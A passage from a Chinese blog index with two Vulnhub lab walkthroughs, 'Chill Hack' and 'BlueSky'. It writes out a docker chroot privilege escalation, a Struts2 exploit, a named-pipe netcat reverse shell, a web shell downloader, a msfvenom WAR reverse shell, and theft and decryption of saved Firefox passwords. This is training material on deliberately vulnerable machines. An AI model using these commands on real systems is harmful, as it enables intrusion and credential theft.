class=""><p>好家伙 还有个base64编码 解密吧</p><img src="/2021/10/17/Chill_Hack/image28.png" class=""><p>返回我们的shell 查看一下用户</p><img src="/2021/10/17/Chill_Hack/image29.png" class=""><p>使用我们得到的密码登入进用户anurodh</p><img src="/2021/10/17/Chill_Hack/image30.png" class=""><p>成功登入</p><p>确认账户密码没问题了 这时候咱们就要用到一开始扫描出的22端口了</p><p>毕竟shell是不稳定的 使用ssh服务登入吧</p><img src="/2021/10/17/Chill_Hack/image31.png" class=""><p>成功登入 有一个稳定的权限的感觉太爽了</p><p>这时候肯定就是提权了是吧</p><p>直接使用经典的sudo su</p><img src="/2021/10/17/Chill_Hack/image32.png" class=""><p>失败了 嗯… 情理之中 意料之外</p><p>使用sudo –l查看sudo的权限 发现apaar可以提权？那就造他</p><img src="/2021/10/17/Chill_Hack/image33.png" class=""><p>查看apaar文件夹下的文件</p><img src="/2021/10/17/Chill_Hack/image34.png" class=""><p>发现apaar下有个txt文件 但由于权限文件我们无法访问</p><p>但上述提到了 apaar下有个sh脚本我们可以执行 那就执行它</p><img src="/2021/10/17/Chill_Hack/image35.png" class=""><p>它需要一个名字 咱们随便输入即可</p><img src="/2021/10/17/Chill_Hack/image36.png" class=""><p>执行完毕了 但我不知道它有效果</p><p>那就阅读一下吧</p><img src="/2021/10/17/Chill_Hack/image37.png" class=""><p>这个批处理 有点意思啊 似乎可以命令执行</p><img src="/2021/10/17/Chill_Hack/image38.png" class=""><p>尝试成功 有点意思</p><p>既然我们没有权限读取local.txt文件 那就让apaar来读取吧</p><img src="/2021/10/17/Chill_Hack/image39.png" class=""><p>啊这 我还以为是什么提权的东西呢 结果你告诉我 这就是个flag？</p><p>那也行吧 flag1 get {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}</p><p>OK 咱们继续找其他方法提权吧</p><p>输入id查看权限</p><img src="/2021/10/17/Chill_Hack/image40.png" class=""><p>嗯？docker？要素察觉</p><p>我们使用一些提权辅助工具<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 在里面搜搜docker</p><img src="/2021/10/17/Chill_Hack/image41.png" class=""><p>使用此命令即可提权docker run -v &#x2F;:&#x2F;mnt –rm -it alpine chroot &#x2F;mnt sh</p><img src="/2021/10/17/Chill_Hack/image42.png" class=""><img src="/2021/10/17/Chill_Hack/image43.png" class=""><p>提权成功</p><p>进入root目录 拿到最后一个flag</p><img src="/2021/10/17/Chill_Hack/image44.png" class=""><p>Flag2 get {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}</p><p>总结语：怎么说呢，这个靶场还是挺有意思的。我起初以为就是简单的一个命令执行getshell以后一个脚本提权就拿下了。没想到还有这么多步骤，挺严谨的吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - BlueSky 靶场实战</title>
      <link href="/2021/10/07/BlueSky/"/>
      <url>/2021/10/07/BlueSky/</url>
      
        <content type="html"><![CDATA[<h1 id="靶场实战-Vulnhub-BlueSky"><a href="#靶场实战-Vulnhub-BlueSky" class="headerlink" title="靶场实战 Vulnhub-BlueSky"></a>靶场实战 Vulnhub-BlueSky</h1><p>首先使用kali扫描靶场的IP地址</p><p>Arp-scan –l</p><img src="/2021/10/07/BlueSky/image1.png" class="" title="image1"><p>对比MAC地址 成功得到靶场IP地址192.168.72.131</p><p>进行端口扫描</p><p>Nmap –Sv –v 192.168.72.131</p><img src="/2021/10/07/BlueSky/image2.png" class="" title="image2"><p>开放了端口22和8080</p><p>22为SSH端口，突破多半都是弱口令，咱们先不考虑这种情况，访问8080的WEB服务器看看</p><p><a href="http://192.168.72.131:8080/">http://192.168.72.131:8080</a></p><img src="/2021/10/07/BlueSky/image3.png" class="" title="image3"><p>访问后发现是tomcat 9.0.40 第一时间想到了tomcat的cve漏洞</p><p>使用searchsploit搜索 tomcat 9.0.40的漏洞</p><img src="/2021/10/07/BlueSky/image4.png" class="" title="image4"><p>嗯…好像没有</p><p>那就测试一波0day吧(弱口令)</p><p>Tomcat&#x2F;tomcat</p><p>Admin&#x2F;admin</p><img src="/2021/10/07/BlueSky/image5.png" class="" title="image5"><p>OK 确认没有0day</p><p>那就只能找该版本存在的漏洞了</p><p>在百度找到一个struts2-showcase的漏洞（s2-048远程代码执行）</p><p>好家伙 直接上工具了哈 就懒得再测试了</p><p>url: <a href="http://192.168.72.131:8080/struts2-showcase/index.action">http://192.168.72.131:8080/struts2-showcase/index.action</a></p><img src="/2021/10/07/BlueSky/image6.png" class="" title="image6"><p>好家伙 这个URL我爆目录还没爆出来 在网上搜索相关漏洞才找到</p><p>下载exp</p><p>git clone <a href="https://github.com/jrrdev/cve-2017-5638.git">https://github.com/jrrdev/cve-2017-5638.git</a></p><p>测试是否存在漏洞</p><p>python exploit.py “<a href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> “whoami”</p><img src="/2021/10/07/BlueSky/image7.png" class="" title="image7"><p>whoami执行成功</p><p>查看是否存在nc权限</p><p>python exploit.py “<a href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> “nc”</p><img src="/2021/10/07/BlueSky/image8.png" class="" title="image8"><p>存在nc权限的 但似乎没有nc –e的权限 得通过其他方式反弹shell了</p><p>首先使用mknod建立管道</p><p>Python exploit.py “<a href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> “mknod &#x2F;tmp&#x2F;backpipe p”</p><img src="/2021/10/07/BlueSky/image9.png" class="" title="image9"><p>Kali监听4444端口</p><p>Nc –nvlp 4444</p><img src="/2021/10/07/BlueSky/image10.png" class="" title="image10"><p>反弹shell，将内容传递物使用管道文件p作为桥梁，进行数据重定向传递</p><p>python exploit.py “<a href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> -c “&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;p | nc 192.168.72.133 4444 1&gt;&#x2F;tmp&#x2F;p”</p><img src="/2021/10/07/BlueSky/image11.png" class="" title="image11"><p>正常来说现在kali是会获取到一个nc的shell的，但我这边不知道什么原因无法成功，先教大家此方法继续操作的方法，我再演示我自己做的替代的方法</p><p>获取到shell后在shell内运行</p><p>python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p><p>因为靶机环境内没有python2的环境，所以我们使用python3提升为一个交互式shell就可以了</p><p>第二种方法：</p><p>第二种方法我们使用window来进行渗透</p><p>首先使用struts2的图形化验证工具进行漏洞验证</p><img src="/2021/10/07/BlueSky/image12.png" class="" title="image12"><p>得到目录地址</p><p>webpath:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;struts2-showcase&#x2F;</p><p>直接上传大马会超出字节限制</p><p>上传冰蝎的马冰蝎会无法识别webshell的密码</p><p>直接上传蚁剑的马也会超出字节限制</p><p>那么怎么办呢？</p><p>很好解决，首先我们上传一个下载文件的一句话木马</p><img src="/2021/10/07/BlueSky/image13.png" class="" title="image13"><p>得到webshell地址</p><p><a href="http://192.168.72.131:8080/struts2-showcase/111.jsp">http://192.168.72.131:8080/struts2-showcase/111.jsp</a></p><p>然后在本地搭建一个web服务器，把要使用的一句话木马或大马放在里面，使用该一句话木马进行访问下载</p><p><a href="http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp">http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp</a></p><p>上面的222.jsp是要保存的webshell马名字</p><p>333.jsp是我们在本地web服务器内储存的名字</p><p>111.jsp是当前的下载马</p><img src="/2021/10/07/BlueSky/image14.png" class="" title="image14"><p>成功下载蚁剑的一句话木马</p><img src="/2021/10/07/BlueSky/image15.png" class="" title="image15"><p>可以成功访问文件，但我们发现该一句话木马似乎无法执行命令，那怎么办呢？</p><p>小问题，我们利用tomcat本身的漏洞进行提权就好了</p><p>首先找到tomcat的账号木马</p><p>地址：&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf&#x2F;tomcat-users.xml</p><p>第45行</p><user username="admin" password="6mzf3>gfZ.pN8_Mp" roles="manager-gui"/><p>成功得到</p><p>账号：admin</p><p>密码：6mzf3&gt;gfZ.pN8_Mp</p><img src="/2021/10/07/BlueSky/image16.png" class="" title="image16"><p>注意：此方法较为麻烦，主要用于无法使用nc弹回shell的情况下使用，我这边使用了各个方法都无法弹回，不得已之下才使用这个方法</p><p>现在我们回到网页去登录账号密码</p><img src="/2021/10/07/BlueSky/image17.png" class="" title="image17"><p>登陆后的状态</p><img src="/2021/10/07/BlueSky/image18.png" class="" title="image18"><p>我们发现下面可以部署文件，OK 那就好办了</p><p>使用WAR木马上传反弹shell就搞定了</p><p>使用msfvenom生成war马</p><p>msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.72.133 LPORT&#x3D;5555 -f war -o shell.war</p><img src="/2021/10/07/BlueSky/image19.png" class="" title="image19"><p>OK 我们去上传</p><img src="/2021/10/07/BlueSky/image20.png" class="" title="image20"><p>成功上传后，我们可以看到&#x2F;shell 这就是我们上传的war马</p><p>在kali中监听5555端口</p><p>Nc –nvlp 5555</p><img src="/2021/10/07/BlueSky/image21.png" class="" title="image21"><p>然后去访问我们上传的war马</p><p>curl <a href="http://192.168.72.131:8080/shell/">http://192.168.72.131:8080/shell/</a></p><img src="/2021/10/07/BlueSky/image22.png" class="" title="image22"><p>OK 我们成功获取到一个shell</p><img src="/2021/10/07/BlueSky/image23.png" class="" title="image23"><p>同样的我们使用python3获取一个交互式shell</p><p>python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p><img src="/2021/10/07/BlueSky/image24.png" class="" title="image24"><p>查看user.txt文件 成功获取user账户的flag</p><img src="/2021/10/07/BlueSky/image25.png" class="" title="image25"><p>我们查看所有文件</p><p>Ls –a</p><img src="/2021/10/07/BlueSky/image26.png" class="" title="image26"><p>在用户根目录下发现mozilla firefox浏览器文件</p><p>对我来说，最想要得到的就是它的用户名密码记录</p><p>不同版本的Firefox保存密码记录的文件名称不同，在网上找到firefox浏览器存储用户名密码的文件是logins.json（版本号大于等于32.0）或者signons.sqlite（版本号大于等于3.5，小于32.0），</p><p>具体信息参考：<a href="http://kb.mozillazine.org/Profile_folder_-_Firefox">http://kb.mozillazine.org/Profile_folder_-_Firefox</a></p><p>进入位置</p><p>.mozilla&#x2F;firefox&#x2F;fvbljmev.default-release</p><p>可以看到两个文件</p><p>key4.db logins.json</p><p>我们要把这两个文件搞出来</p><p>使用python3开启web服务器</p><p>python3 -m http.server 6666</p><p>使用wget成功拷贝两个文件</p><p>wget <a href="http://192.168.72.131:6666/logins.json">http://192.168.72.131:6666/logins.json</a></p><p>wget <a href="http://192.168.72.131:6666/key4.db">http://192.168.72.131:6666/key4.db</a></p><img src="/2021/10/07/BlueSky/image27.png" class="" title="image27"><p>下载解密脚本</p><p><a href="https://github.com/lclevy/firepwd">https://github.com/lclevy/firepwd</a></p><p>git clone <a href="https://github.com/lclevy/firepwd.git">https://github.com/lclevy/firepwd.git</a></p><p>cd firepwd</p><p>pip3 install -r requirements.txt</p><img src="/2021/10/07/BlueSky/image28.png" class="" title="image28"><p>运行python3 firepwd.py</p><p><a href="https://twitter.com:b'minhtuan',b'skysayohyeah">https://twitter.com:b'minhtuan',b'skysayohyeah</a>‘</p><p>得到账号：minhtuan</p><p>得到密码：skysayohyeah</p><p>我们使用sudo –l查看sudo权限</p><img src="/2021/10/07/BlueSky/image29.png" class="" title="image29"><p>权限挺高 直接sudo su即可成功提权</p><img src="/2021/10/07/BlueSky/image30.png" class="" title="image30"><img src="/2021/10/07/BlueSky/image31.png" class="" title="image31"><p>成功拿到root权限的flag</p><p>本次靶场完成</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
